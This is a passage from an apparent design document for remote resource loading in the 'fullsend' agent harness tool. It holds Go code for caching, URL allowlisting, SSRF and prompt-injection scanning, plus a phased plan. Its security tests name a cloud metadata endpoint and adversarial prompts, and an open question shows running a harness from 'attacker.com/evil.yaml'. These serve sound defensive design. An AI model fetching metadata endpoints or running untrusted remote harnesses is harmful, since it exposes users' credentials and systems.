    hash := ComputeSHA256(content)
    dir := CachePath(workspaceRoot, hash)

    // Use restrictive permissions (0700/0600) to prevent other users from reading
    // cached resources on shared runners. Cached resources may contain organizational
    // configuration that should not be world-readable.
    if err := os.MkdirAll(dir, 0700); err != nil {
        return err
    }

    entry := CacheEntry{
        URL:       url,
        FetchTime: time.Now(),
        SHA256:    hash,
    }
    metaData, err := json.MarshalIndent(entry, "", "  ")
    if err != nil {
        return fmt.Errorf("marshaling cache metadata: %w", err)
    }
    // REQUIRED for Phase 1: Production implementation must use atomic writes
    // (write to temp file, then os.Rename) as specified in Phase 1 requirements.
    // This illustrative code writes separately for clarity but would leave partial
    // cache entries on crash.
    if err := os.WriteFile(filepath.Join(dir, "metadata.json"), metaData, 0600); err != nil {
        return err
    }
    if err := os.WriteFile(filepath.Join(dir, "content"), content, 0600); err != nil {
        return err
    }

    return nil
}
```

### 5. Dependency Resolver

**File:** `internal/resolve/resolve.go` (new)

```go
package resolve

import (
    "context"
    "fmt"
    "path/filepath"
    "strings"
    "time"

    "github.com/fullsend-ai/fullsend/internal/fetch"
    "github.com/fullsend-ai/fullsend/internal/harness"
    "github.com/fullsend-ai/fullsend/internal/security"
)

type ResolvedHarness struct {
    Harness      *harness.Harness
    AgentPath    string   // absolute path or cache path
    PolicyPath   string
    SkillPaths   []string
    Dependencies []Dependency
}

type Dependency struct {
    URL        string
    LocalPath  string // cache path
    SHA256     string
    FetchedAt  time.Time
}

// ResolveHarness resolves all resources (local and remote) and returns paths.
func ResolveHarness(ctx context.Context, workspaceRoot string, h *harness.Harness, policy fetch.FetchPolicy) (*ResolvedHarness, error) {
    resolved := &ResolvedHarness{Harness: h}
    resourceCount := 0

    // Resolve agent
    var err error
    resolved.AgentPath, err = resolveResourceWithLimits(ctx, workspaceRoot, h.Agent, h.AllowedRemoteResources, policy, 0, &resourceCount, "")
    if err != nil {
        return nil, fmt.Errorf("resolving agent: %w", err)
    }

    // Resolve policy
    if h.Policy != "" {
        resolved.PolicyPath, err = resolveResourceWithLimits(ctx, workspaceRoot, h.Policy, h.AllowedRemoteResources, policy, 0, &resourceCount, "")
        if err != nil {
            return nil, fmt.Errorf("resolving policy: %w", err)
        }
    }

    // Resolve skills
    // Phase 1: Single-level only (skills themselves cannot reference URLs)
    // Phase 2+: Each skill may have transitive dependencies (code below)
    for _, skill := range h.Skills {
        skillPath, err := resolveResourceWithLimits(ctx, workspaceRoot, skill, h.AllowedRemoteResources, policy, 0, &resourceCount, "")
        if err != nil {
            return nil, fmt.Errorf("resolving skill %s: %w", skill, err)
        }
        resolved.SkillPaths = append(resolved.SkillPaths, skillPath)

        // Phase 2+: Parse skill to extract transitive dependencies
        // (skill format TBD — may have a dependencies: field in frontmatter)
        // Recursively resolve those dependencies
    }

    return resolved, nil
}

// resolveResourceWithLimits resolves a single resource with depth and count limits.
// Phase 1: depth is always 0 (no transitive resolution), parentRef is unused
// Phase 2+: depth tracking prevents cycles and runaway recursion, parentRef enables relative path resolution
func resolveResourceWithLimits(ctx context.Context, workspaceRoot, ref string, allowedPrefixes []string, policy fetch.FetchPolicy, depth int, resourceCount *int, parentRef string) (string, error) {
    // Phase 2+: Check depth limit (Phase 1 always passes since depth=0)
    if depth > policy.MaxDepth {
        return "", fmt.Errorf("exceeded maximum dependency depth of %d", policy.MaxDepth)
    }

    // Check resource count limit (applies to all phases)
    if *resourceCount >= policy.MaxResources {
        return "", fmt.Errorf("exceeded maximum resource count of %d", policy.MaxResources)
    }

    if harness.IsURL(ref) {
        // Increment resource count for remote fetches
        *resourceCount++

        // Check if URL matches allowed prefixes
        if !matchesAllowedPrefix(ref, allowedPrefixes) {
            return "", fmt.Errorf("URL %s does not match allowed_remote_resources", ref)
        }

        // Parse integrity hash (mandatory for all remote resources)
        cleanURL, expectedHash, hasHash := harness.ParseIntegrityHash(ref)
        if !hasHash {
            return "", fmt.Errorf("remote resource %s must include integrity hash (#sha256=...)", ref)
        }

        // Check cache first (hasHash is guaranteed to be true here)
        content, _, err := fetch.CacheGet(workspaceRoot, expectedHash)
        if err != nil {
            return "", fmt.Errorf("reading cache for %s: %w", cleanURL, err)
        }
        if content != nil {
            // Re-verify integrity on cache hit to prevent tampering
            // Even though cache path includes hash, a compromised process could replace content
            actualHash := fetch.ComputeSHA256(content)
            if actualHash != expectedHash {
                return "", fmt.Errorf("cache integrity check failed for %s: expected %s, got %s (cache may be corrupted or tampered)", cleanURL, expectedHash, actualHash)
            }
            return filepath.Join(fetch.CachePath(workspaceRoot, expectedHash), "content"), nil
        }

        // If offline mode is enabled, fail on cache miss
        if policy.Offline {
            return "", fmt.Errorf("resource %s not in cache and --offline mode is enabled", cleanURL)
        }

        // Fetch from URL
        content, err = fetch.FetchURL(ctx, cleanURL, policy)
        if err != nil {
            return "", fmt.Errorf("fetching %s: %w", cleanURL, err)
        }

        // Security scan BEFORE integrity check and caching
        // This ensures malicious content is never written to cache
        if err := security.ScanResource(content, security.RemoteResourcePolicy); err != nil {
            return "", fmt.Errorf("security scan failed for %s: %w", cleanURL, err)
        }

        // Verify integrity hash (hasHash is guaranteed to be true here)
        actualHash := fetch.ComputeSHA256(content)
        if actualHash != expectedHash {
            return "", fmt.Errorf("integrity hash mismatch for %s: expected %s, got %s", cleanURL, expectedHash, actualHash)
        }

        // Store in cache (only after scan and integrity verification pass)
        if err := fetch.CachePut(workspaceRoot, cleanURL, content); err != nil {
            return "", fmt.Errorf("caching %s: %w", cleanURL, err)
        }

        return filepath.Join(fetch.CachePath(workspaceRoot, actualHash), "content"), nil
    }

    // Local path — return as-is (already resolved by ResolveRelativeTo)
    return ref, nil
}

// matchesAllowedPrefix checks if a URL matches any of the allowed prefixes.
// Canonicalizes the URL first to prevent percent-encoding bypass attacks.
// IMPORTANT: This relies on the Validate() method enforcing trailing slashes on
// allowed_remote_resources entries to prevent prefix confusion attacks
// (e.g., "https://github.com/org/library-evil/" won't match prefix
// "https://github.com/org/library/"). See ADR-0038 security analysis.
// REQUIRED for Phase 1: Production implementation must handle double-encoded
// percent attacks (%252F → %2F → /). Phase 1 requirements specify either
// iterative decoding (max 3 iterations) or rejecting URLs containing %25.
// This illustrative code uses url.Parse which only decodes once.
func matchesAllowedPrefix(rawURL string, allowedPrefixes []string) bool {
    // REQUIRED for Phase 1: Reject double-encoded URLs to prevent prefix bypass
    // url.Parse only decodes once, so %252F (double-encoded /) would bypass prefix checks
    if strings.Contains(rawURL, "%25") {
        return false
    }

    // Parse and canonicalize the URL to prevent percent-encoding bypass
    u, err := url.Parse(rawURL)
    if err != nil {
        return false
    }

    // Reject URLs with userinfo (username:password@host)
    if u.User != nil {
        return false
    }

    // Normalize URL using RFC 3986 semantics via url.ResolveReference
    // This properly handles percent-encoding, empty segments, and path normalization
    // without applying POSIX-specific path.Clean() semantics
    base := &url.URL{Scheme: u.Scheme, Host: u.Host}
    resolved := base.ResolveReference(u)

    // Build canonical URL from normalized components
    canonicalURL := resolved.Scheme + "://" + resolved.Host + resolved.EscapedPath()
    if resolved.RawQuery != "" {
        canonicalURL += "?" + resolved.RawQuery
    }

    for _, prefix := range allowedPrefixes {
        if strings.HasPrefix(canonicalURL, prefix) {
            return true
        }
    }
    return false
}
```

### 6. CLI Integration

**File:** `internal/cli/run.go` (changes)

```go
// In runAgent():

// After loading harness and resolving paths:
h, err := harness.Load(harnessPath)
// ...
if err := h.ResolveRelativeTo(absFullsendDir); err != nil {
    return fmt.Errorf("resolving paths: %w", err)
}

// NEW: Resolve remote resources
fetchPolicy := fetch.DefaultPolicy
// TODO: Load allowed domains from config.yaml
resolved, err := resolve.ResolveHarness(ctx, workspaceRoot, h, fetchPolicy)
if err != nil {
    return fmt.Errorf("resolving remote resources: %w", err)
}

// Use resolved.AgentPath, resolved.PolicyPath, etc. instead of h.Agent, h.Policy
```

### 7. Security Scanner Integration

**File:** `internal/security/scan.go` (changes)

When a resource is fetched from a URL, it must be scanned before caching:

```go
// In fetch/fetch.go, after fetching content:

if isRemote {
    if err := security.ScanResource(content, security.RemoteResourcePolicy); err != nil {
        return nil, fmt.Errorf("security scan failed: %w", err)
    }
}
```

Remote resources use a stricter policy:

```go
// internal/security/policy.go
var RemoteResourcePolicy = ScanPolicy{
    UnicodeNormalizer: true,
    ContextInjection:  true,  // no opt-out for remote
    LLMGuard: LLMGuardConfig{
        Enabled:   true,
        Threshold: 0.95,  // higher threshold than local (0.92)
    },
}
```

### 8. Audit Logging

**File:** `internal/audit/fetch_log.go` (new)

All fetches are logged to a structured log:

```go
package audit

import (
    "encoding/json"
    "fmt"
    "os"
    "path/filepath"
    "time"
)

type FetchLog struct {
    TraceID    string    `json:"trace_id"`
    FetchTime  time.Time `json:"fetch_time"`
    URL        string    `json:"url"`
    SHA256     string    `json:"sha256"`
    FetchType  string    `json:"fetch_type"`  // "static" or "runtime"
    AllowedBy  string    `json:"allowed_by"`  // which allowed_remote_resources entry matched
}

// LogFetch appends a fetch record to the audit log.
// Note: Audit logs are kept in user home directory for persistence across workspaces.
// This is configurable via FULLSEND_AUDIT_DIR environment variable.
func LogFetch(log FetchLog) error {
    logDir := os.Getenv("FULLSEND_AUDIT_DIR")
    if logDir == "" {
        home, err := os.UserHomeDir()
        if err != nil {
            return fmt.Errorf("getting home directory for audit logs: %w", err)
        }
        logDir = filepath.Join(home, ".cache", "fullsend", "audit")
    }
    if err := os.MkdirAll(logDir, 0755); err != nil {
        return fmt.Errorf("creating audit log directory: %w", err)
    }

    logPath := filepath.Join(logDir, "fetches.jsonl")
    f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        return err
    }
    defer f.Close()

    data, err := json.Marshal(log)
    if err != nil {
        return fmt.Errorf("marshaling fetch log: %w", err)
    }
    _, err = f.Write(append(data, '\n'))
    return err
}
```

### 9. Offline Mode

Add a CLI flag to disable all network fetches:

```go
// internal/cli/run.go
cmd.Flags().Bool("offline", false, "disable network fetches (use cached resources, fail on cache miss)")

// In runAgent():
// offline flag is passed to the resolver, which attempts cache lookups
// and only errors on cache misses (see resolve.go implementation)
fetchPolicy := fetch.DefaultPolicy
if offline {
    fetchPolicy.Offline = true
}
resolved, err := resolve.ResolveHarness(ctx, workspaceRoot, h, fetchPolicy)
```

## Migration Path

### Phase 1: Read-only URL support (MVP)

- Implement URL detection, fetch, cache, SSRF protection
- **Mandatory hash pinning:** All URLs must include `#sha256=...` fragments. URLs without hashes are rejected.
- Support URLs for agents, skills, policies (declarative resources only)
- Require all URL references to be declared in `allowed_remote_resources`
- No runtime fetch—all resources resolved at harness load time
- **No transitive dependency resolution** (skills/policies cannot themselves reference URL-based dependencies)
- **No cycle detection needed** — only single-level references are supported (harness → resource, but resource cannot → another resource)
- **Atomic cache writes required:** Cache implementation must use write-to-temp-then-rename pattern (via `os.WriteFile` + `os.Rename`) to prevent partial cache entries from crashes
- **Double-encoding mitigation required:** URL canonicalization must either apply iterative percent-decoding (max 3 iterations) or reject URLs containing `%25` (encoded percent sign) to prevent bypass of prefix checks

**Deliverable:** `fullsend run` can load a harness that references `agent: https://...#sha256=abc123...`

**Scope limitation:** URL-referenced resources in Phase 1 are treated as leaf nodes. They cannot contain URL references to other resources. This simplifies implementation and defers dependency graph complexity to Phase 2.

### Phase 2: Transitive dependency resolution

- Extend skill format to support `dependencies:` field in frontmatter
- Implement recursive resolution in `internal/resolve/`
- Build full dependency DAG before sandbox creation
- Detect cycles

**Deliverable:** A URL-referenced skill can itself reference other skills or policies

### Phase 3: Lock files for transitive dependencies

- Generate `.fullsend/lock.yaml` file that pins all transitive dependencies (URLs and hashes)
- Lock file ensures reproducible builds across environments
- Warn when harness references change but lock file is not updated

**Deliverable:** `fullsend lock harness/code.yaml` generates a lock file with all resolved dependencies

**Strawman lock file schema (`.fullsend/lock.yaml`):**

```yaml
# Generated by fullsend lock harness/code.yaml
# DO NOT EDIT - This file is auto-generated
version: 1
generated_at: "2026-05-12T14:30:00Z"

harnesses:
  code:
    source: harness/code.yaml
    sha256: "abc123..."  # hash of the harness file itself
    dependencies:
      agent:
        url: https://github.com/fullsend-ai/library/agents/code.md
        sha256: "def456..."
        resolved_at: "2026-05-12T14:29:55Z"
      policy:
        path: policies/local-code-policy.yaml  # local paths recorded for completeness
        sha256: "789abc..."
      skills:
        - url: https://github.com/fullsend-ai/library/skills/rust/SKILL.md
          sha256: "123def..."
          resolved_at: "2026-05-12T14:29:56Z"
          transitive_deps:
            - url: https://github.com/prodsec/agent-skills/security-baseline.md
              sha256: "456789..."
              resolved_at: "2026-05-12T14:29:57Z"
```

**Interaction with dependency resolution:**
- On `fullsend run`, if `.fullsend/lock.yaml` exists and contains an entry for the harness, use pinned URLs/hashes from lock file instead of re-resolving
- If harness YAML references change but lock file is stale, warn: "harness/code.yaml has changed since lock file was generated. Run `fullsend lock harness/code.yaml` to update."
- `fullsend lock --update` re-resolves all dependencies and updates lock file

### Phase 4: Runtime dependency loading

- Implement `fullsend-fetch-skill` binary for sandbox use
- Add `allow_runtime_fetch: true` flag to harness schema
- Enforce runtime fetches against `allowed_remote_resources`
- Audit log all runtime fetches

**Deliverable:** Agents can fetch skills mid-run if the harness allows it

## Testing Strategy

### Unit tests

- `internal/fetch/fetch_test.go`: Test SSRF protection (internal IPs, redirects, non-HTTPS)
- `internal/fetch/cache_test.go`: Test cache storage and retrieval
- `internal/resolve/resolve_test.go`: Test dependency resolution (Phase 2+: cycle detection)

### Integration tests

- `e2e/universal_harness_test.go`: End-to-end test of fetching a remote harness, resolving dependencies, running the agent
- Test with a mock HTTP server serving malicious resources (internal IP redirects, large responses, adversarial content)

### Security tests

- Attempt to fetch `http://` URLs (should fail)
- Attempt to fetch `https://169.254.169.254/` (should fail)
- Fetch a URL that redirects to an internal IP (should fail)
- Fetch a URL with mismatched integrity hash (should fail)
- Fetch a resource containing a known adversarial prompt (should fail LLM Guard)

## Open Questions

These implementation-level questions can be resolved during Phase 1/2 development based on operational experience:

### 1. Top-level harness URL protection

When running `fullsend run https://attacker.com/evil.yaml#sha256=abc123`, the global domain allowlist in `config.yaml` (which includes `github.com` by default) is the only protection. Hash pinning prevents silent substitution, but not social engineering—a user can be tricked into pinning malicious content.

**Options:**

- **A: Require explicit confirmation** when the top-level harness is a URL not matching a configured "trusted harness prefixes" list (narrower than the global domain allowlist). User must confirm: "This harness references resources from: [domain list]. Continue? [y/N]"
- **B: Refuse URL-based top-level harnesses** unless they match org-level `allowed_harness_prefixes` (separate from `allowed_remote_resources`). Force users to add trusted harness sources explicitly.
- **C: Display content summary before execution:** Show all resources referenced, domains accessed, and commands that will run. User must review and confirm.
- **D: No additional protection** — rely on hash pinning and user vigilance. Document best practices for verifying harness content before use.

**Recommendation:** Option A provides a middle ground — low friction for trusted sources, explicit confirmation for external sources. Prevents drive-by attacks while preserving ease of use.

### 2. Cache eviction

The cache grows unbounded. When should cached resources be evicted?

**Options:**

- **A: TTL-based.** Cached resources expire after 24 hours (configurable).
- **B: LRU.** Keep the N most recently used resources.
- **C: Manual.** `fullsend cache clean` command to clear cache.

**Recommendation:** C (Manual eviction). Since all remote resources require hash pinning, cached entries are content-addressed and immutable. Eviction should be storage-bounded (e.g., `fullsend cache clean --max-size 1GB`) rather than TTL-based. Add `fullsend cache clean` for manual eviction.

## Resolved Questions

The following questions have been resolved at the architecture level in ADR-0038's "Resolved design questions" section. The options and recommendations below reflect those ADR decisions and are included here for implementation reference:

### Signature verification [RESOLVED in ADR-0038]

Should remote resources be cryptographically signed by their publisher?

**Decision:** Phase 1 does not support signature verification. Hash pinning (mandatory SHA256 integrity hashes) provides content integrity. Signature verification is deferred to Phase 3 as an optional enhancement.

**Rationale:** Hash pinning prevents content substitution attacks. Signatures add provenance (proving who published the resource) but require PKI infrastructure. For MVP, HTTPS transport security + domain allowlists + integrity hashes provide sufficient protection.

### Namespace governance [RESOLVED in ADR-0038]

Who controls `https://cdn.fullsend.ai/skills/`? How do community contributors publish skills?

**Decision:** Decentralized publishing model. No centralized `cdn.fullsend.ai` or registry. Contributors publish resources on their own domains (GitHub repos, personal sites, org-controlled CDNs). Consumers add trusted domains to their org-level `allowed_remote_resources` allowlist.

**Rationale:** Avoids central gatekeeping and single point of failure. Aligns with the threat model: organizations control what they trust via allowlists.

### Version resolution [RESOLVED in ADR-0038]

If a skill references `policy: rust-sandbox@v2` (a name+version, not a URL), how is that resolved to a URL?

**Decision:** No version resolution. All resource references must be full URLs with explicit integrity hashes. No "magic" resolution of names or version specifiers to URLs.

**Rationale:** Explicit URLs make dependencies auditable and prevent dependency confusion attacks. Version resolution requires a central registry or org-level alias files (indirection that obscures actual dependencies).

## Related Documents

- **[ADR-0024: Harness Definitions](../ADRs/0024-harness-definitions.md)** — Current harness schema and resolution logic
- **[ADR-0022: Output Schema Enforcement](../ADRs/0022-harness-level-output-schema-enforcement.md)** — Security validation of agent output
- **[ADR-0017: Credential Isolation](../ADRs/0017-credential-isolation-for-sandboxed-agents.md)** — Sandbox security model
- **[Security Threat Model](../problems/security-threat-model.md)** — Threat priority and attack vectors
- **[Agent Architecture](../problems/agent-architecture.md)** — Agent composition and interaction patterns

## Conclusion

Universal harness access enables a composable, shareable ecosystem of agents, skills, and policies while introducing significant security challenges. The proposed design balances flexibility (URLs, transitive closure, runtime fetch) with security (SSRF protection, integrity hashing, stricter scanning for remote resources).

**Key principles:**

1. **Declarative resources can be remote; executable resources must be local**
2. **All fetches are logged and auditable**
3. **Remote resources are scanned more strictly than local resources**
4. **Transitive closure applies uniformly**
5. **Offline mode supports CI/CD environments**

This design should be reviewed for security implications before acceptance. See [ADR-0038](../ADRs/0038-universal-harness-access.md) for the decision record.
